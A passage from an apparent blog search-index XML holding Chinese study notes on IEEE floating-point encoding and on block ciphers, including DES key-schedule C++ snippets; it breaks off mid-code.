1111</code>)这种情况，e由上述读出来为127，<strong>阶码E</strong>=127-127=0，2<sup>E</sup>=2<sup>0</sup>=1而有效小数字段从左往右按二进制小数的格式读，通过为<strong>小数f</strong>=0x2<sup>-1</sup>+1x2<sup>-2</sup>+···=1/4，然后该浮点数是规格化的值M=1+f=5/4，最后该浮点数的值</p><p><strong>V=(-1)<sup>s</sup>xMx2<sup>E</sup>=(-1)<sup>0</sup>x5/4x2<sup>0</sup>=1.25</strong></p><ul><li><p><strong>情况2（非规格化的值）：当阶码域全为0时</strong>，所表示的数是非规格化形式。在这种情况下，阶码值是E=1-Bias，而<strong>尾数的值是M=f</strong>，也就是小数字段的值，不包含隐含的开头1。</p><p>非规格化数有两个用途。首先，它们提供了一种表示数值0的方法，因为使用规格化数，我们必须总是使M&gt;=1，因此我们就不能表示0。实际上，+0.0的浮点表示的位模式为全0：符号位全为0，阶码字段全是0，而小数域也全为0，这就得到M=f=0。令人奇怪的是，当符号位为1，而其他域全为0时，我们得到值-0.0。根据IEEE的浮点格式，值+0.0和-0.0在某些方面被认为是不同的，而在某些方面又是相同的。</p></li><li><p><strong>情况3：特殊值：当阶码全为1的时候出现的</strong>。当小数域全为0时，得到的值表示负无穷，当s=0时是+∞，或者当s=1时是-∞。当我们把两个非常大的数相乘，或者除以0时，无穷能够表示溢出的结果。当小数域为非零时，结果值被称为“NaN”，即“不是一个数（Not a Number）”的缩写。一些运算结果不能是实数或者无穷，就会返回NaN值，比如当计算<img src="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/1334023-20190725160847303-1161348170.png" class="lazyload" data-srcset="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/1334023-20190725160847303-1161348170.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img">或<img src="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/1334023-20190725160905239-235939136.png" class="lazyload" data-srcset="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/1334023-20190725160905239-235939136.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img">时。在某些应用中，表示未初始化的数据时，它们也很有用处。</p></li></ul><p><img src="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/1334023-20190725205803366-1095600159.png" class="lazyload" data-srcset="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/1334023-20190725205803366-1095600159.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p><img src="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/1334023-20190726142521147-277604587.png" class="lazyload" data-srcset="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/1334023-20190726142521147-277604587.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><ul><li> 最大的规格化值的位表示的符号位为0，阶码的最低有效位等于0，其他位等于1。 它的小数值f=1-2-n，尾数M=2-2-n（我们写作2-ε），它的阶码值E=2k-1-1，得到数值<img src="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/1334023-20190726144140656-486774485.png" class="lazyload" data-srcset="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/1334023-20190726144140656-486774485.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img">。</li></ul><p>我们知道12345具有的二进制表示<code>11 0000 0011 1001</code>，通过将二进制小数点左移13位，我们创建这个数的规格化表示，得到12345=<code>1.1000 0001 1100 12</code>*2<sup>13</sup>。为了用IEEE单精度形式来编码，我们丢弃开头的1，并在末尾增加10个0，来构造小数字段，得到二进制表示<code>1000 0001 1100 1000 0000 000</code>(小数位共23位)。为了构造阶码字段，我们用13加上偏置量127，得到140，其二进制表示<code>1000 1100</code>。加上符号位0，我们就得到二进制的浮点表示<code>0|1000 1100|1000 0001 1100 1000 0000 000</code>。我们观察到整数值12345（0x3039）和单精度浮点数值12345.0（0x4640E400）再在位级表示上有下列关系：</p><p><img src="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/1334023-20190726145531668-33965862.png" class="lazyload" data-srcset="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/1334023-20190726145531668-33965862.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><img src="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/image-20201215151018433.png" class="lazyload" data-srcset="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/image-20201215151018433.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201215151018433" style="zoom:67%;">]]></content>
      
      
      <categories>
          
          <category> 深入理解计算机系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学-分组密码体制</title>
      <link href="/2020/11/24/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/"/>
      <url>/2020/11/24/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="分组密码概述"><a href="#分组密码概述" class="headerlink" title="分组密码概述"></a>分组密码概述</h1><p><strong>分组密码是许多系统安全的一个重要组成部分。可用于构造</strong></p><p>伪随机数生成器 </p><p>流密码 </p><p>消息认证码和杂凑函数 </p><p>消息认证技术、数据完整性机制、实体认证协议以及单钥数字签字体制</p><p><img src="/2020/11/24/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/image-20201124173747066.png" class="lazyload" data-srcset="/2020/11/24/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/image-20201124173747066.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201124173747066"></p><p>通常n=m。若n&gt;m，则为有数据扩展的分组密码；若n&lt;m，则为有数据压缩的分组密码</p><h1 id="安全性设计原则"><a href="#安全性设计原则" class="headerlink" title="安全性设计原则"></a>安全性设计原则</h1><h2 id="混淆原则"><a href="#混淆原则" class="headerlink" title="混淆原则"></a>混淆原则</h2><p>混淆原则就是将密文、明文、密钥三者之间的统计关系和代数关系变得尽可能复杂，使得低手即使获得了密文以及明文，也无法求得出密钥的任何信息；即使获得了密文和明文的统计规律，也无法求出明文的新的信息。</p><p><strong>明文不能由已知的明文，密文及少许密钥比特代数地或统计地表示出来</strong></p><p><strong>密钥不能由已知的明文，密文及少许密钥比特代数地或统计地表示出来</strong></p><h1 id="扩散原则"><a href="#扩散原则" class="headerlink" title="扩散原则"></a>扩散原则</h1><p>扩散原则就是应将明文的统计规律和结构规律散射到相当长的一段统计中去</p><h1 id="SP网络"><a href="#SP网络" class="headerlink" title="SP网络"></a>SP网络</h1><p>替代与置换网络</p><h1 id="Festital密码结构"><a href="#Festital密码结构" class="headerlink" title="Festital密码结构"></a>Festital密码结构</h1><p>分组密码作用在n位明文分组上，而产生n位密文分组。共有2<sup>n</sup>个不同的明文分组，且由于加密是可逆的(既可以解密)，每一个明文分组将唯一对应一个密文分组。这样的变换称为<strong>可逆变换</strong>，或<strong>非奇异变换</strong>。</p><p><img src="/2020/11/24/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/image-20201206085025447.png" class="lazyload" data-srcset="/2020/11/24/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/image-20201206085025447.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201206085025447"></p><p>下图给出了n=4时的一个普通代替密码结构。4位的输入有16种可能的输入状态，每一种被代替密码映射成16种可能输出状态中的唯一 一个，每一个表示4位的密文输出。加密和解密映射可由上图一样用表来定义。这是分组密码的最一般的形式，能用来定义明密文之间的任意可逆变换。</p><p>Feistel称这种密码为理想分组密码，因为它允许生成最大数量的加密映射来映射明文分组</p><p><img src="/2020/11/24/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/image-20201206085507096.png" class="lazyload" data-srcset="/2020/11/24/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/image-20201206085507096.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201206085507096"></p><p><img src="/2020/11/24/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/image-20201206085711304.png" class="lazyload" data-srcset="/2020/11/24/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/image-20201206085711304.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201206085711304"></p><p>从实现和运行的角度来看，采用大规模分组的任意可逆代替密码(即理想分组密码)是不可行的。因为对于这样的变换，映射本身就是一个密钥，</p><p>上表定义了n=4时的某个可逆映射，这个映射由表中第二列来定义，给出了每个明文对应的密文，本质它就是决定所有可能映射中某一个映射的密钥。在这种情况下，运用最直接的方法定义密钥，密钥长度为4*16=64位。</p><h1 id="DES加密-一个DES例子"><a href="#DES加密-一个DES例子" class="headerlink" title="DES加密(一个DES例子)"></a>DES加密(一个DES例子)</h1><p>对于任意加密方案，总有两个输入：<strong>明文和密钥</strong>。</p><p>DES的明文长64位，密钥长位56位。DES加密一组64位的信息，也就是16个16进制数，同样使用64位长的密码，但是在使用过程中密钥的每第8位被忽略掉，所以使用的有效DES密钥长度为56位。</p><p><img src="/2020/11/24/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/image-20201206211547797.png" class="lazyload" data-srcset="/2020/11/24/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/image-20201206211547797.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201206211547797"></p><h2 id="对于密钥的处理有以下流程："><a href="#对于密钥的处理有以下流程：" class="headerlink" title="对于密钥的处理有以下流程："></a>对于密钥的处理有以下流程：</h2><ul><li>64位密钥置换成56位</li><li>56位密钥分成2个28位的左右序列</li><li>序列分别独立做循环左移</li><li>左移后进行合并56位（这里的结果要参与下一次的循环左移运算）56位再进行置换成48位即可参与轮函数的运算</li><li>由于轮函数有16轮，所以第二步第三步和第四步需要执行16次，输出16个48位的序列。</li></ul><p>首先看左边，对于密钥的处理，输入的是64位的密钥，其中8位是奇偶检验位，通过<strong>第一次置换选择将64位转为48位</strong>，置换表如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> PC_1[] = &#123;<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,</span><br><span class="line">   <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">  <span class="number">10</span>,  <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line">  <span class="number">19</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line">  <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,</span><br><span class="line">   <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">  <span class="number">14</span>,  <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line">  <span class="number">21</span>, <span class="number">13</span>,  <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>,  <span class="number">4</span>&#125;; </span><br></pre></td></tr></table></figure><p>这里补充一下<strong>置换表</strong>的使用：可以看到该表第1位是57，所以应该取原序列的第57位到变化序列的第1位，以此类推，原序列的第49位到变化序列的第2位····，而且由于此表只有48位，所以变化序列应该也为48位，但是原序列64位，所以有些数据被舍去，这样就达到了缩减位数的目的。</p><p>以下是置换函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">56</span>;i++)</span><br><span class="line">       realkeys[<span class="number">55</span>-i]=key[<span class="number">64</span>-PC_1[i]];<span class="comment">//置换是从右往左开始</span></span><br></pre></td></tr></table></figure><p>进入一个16次的循环：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> time=<span class="number">0</span>;time&lt;<span class="number">16</span>;time++)&#123;</span><br><span class="line">       <span class="comment">//先拿后每28位 然后分别进行左移  </span></span><br><span class="line">       <span class="comment">//再合成赋值给原来的realkeys  </span></span><br><span class="line">       <span class="comment">//原来的realkey(56)置换成最后的compresskey(48)存入数组</span></span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">28</span>;i++)&#123;</span><br><span class="line">           rightkey[i]=realkeys[i];</span><br><span class="line">           leftkey[i]=realkeys[i+<span class="number">28</span>];</span><br><span class="line">       &#125;      </span><br><span class="line">       rightkey=<span class="built_in">leftshifts</span>(rightkey,shiftBits[time]);</span><br><span class="line">       leftkey=<span class="built_in">leftshifts</span>(leftkey,shiftBits[time]);</span><br><span class="line">       <span class="comment">//左移之后两个key赋值回原来的realkey</span></span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">56</span>;i++)&#123;</span><br><span class="line">           <span class="keyword">if</span>(i&lt;<span class="number">28</span>)&#123;</span><br><span class="line">               realkeys[i]=rightkey[i];</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">else</span>&#123;</span><br><span class="line">               realkeys[i]=leftkey[i<span class="number">-28</span>];</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//从56-&gt;48存在暂存</span></span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">48</span>;i++)&#123;</span><br><span class="line">           compresskeys[<span class="number">47</span>-i]=realkeys[<span class="number">56</span>-PC_2[i]];<span class="comment">//置换是从右往左边开始的</span></span><br><span class="line">       &#125;</span><br><span class="line">       cout&lt;&lt;<span class="string">&quot;48bitreky:&quot;</span>&lt;&lt;realkeys&lt;&lt;endl;</span><br><span class="line">       subKey[time]=compresskeys;</span><br><span class="line">       cout&lt;&lt;<span class="string">&quot;--------------------------&quot;</span>&lt;&lt;endl;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>先拿<code>realkey</code>的前后各28位，然后根据左移表的数值进行各自的<strong>循环</strong>左移，然后再进行合并，再进行一次56-&gt;48位置换缩减，最后填入<code>subKey</code>中，以便接下来轮函数的运算。</p><p>下面是左移函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">bitset&lt;28&gt; <span class="title">leftshifts</span><span class="params">(bitset&lt;<span class="number">28</span>&gt; key, <span class="keyword">int</span> position)</span></span>&#123;</span><br><span class="line">    bitset&lt;28&gt; temp_key=key;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">27</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i-position&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            key[i]=temp_key[i-position];<span class="comment">//假设偏移是1 27就要26</span></span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* 此时的码应该从前面取 循环偏移*/</span></span><br><span class="line">            key[i]=temp_key[i-position+<span class="number">28</span>];<span class="comment">//假设偏移是1 -1的位置+28就是最头的位置</span></span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="关于明文的处理以及轮函数："><a href="#关于明文的处理以及轮函数：" class="headerlink" title="关于明文的处理以及轮函数："></a>关于明文的处理以及轮函数：</h2><ul><li>首先对输出的64位明文进行初始置换</li><li>置换后将序列分成左右序列</li><li>左序列等于有序列,右序列32位与48位密钥进入轮函数</li><li>轮函数的输出为32位再与左序列异或</li><li>第三步和第四步开始循环16次</li><li>最后交换左右序列进行逆初始置换</li></ul><p><img src="/2020/11/24/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/image-20201206214951468.png" class="lazyload" data-srcset="/2020/11/24/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/image-20201206214951468.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201206214951468"></p><p>初始置换：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">64</span>; ++i)</span><br><span class="line">currentBits[<span class="number">63</span>-i] = plain[<span class="number">64</span>-IP[i]];</span><br></pre></td></tr></table></figure><p>分左右序列：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">        rightBits[i]=currentBits[i];</span><br><span class="line">        leftBits[i]=currentBits[i+<span class="number">32</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>十六次轮函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 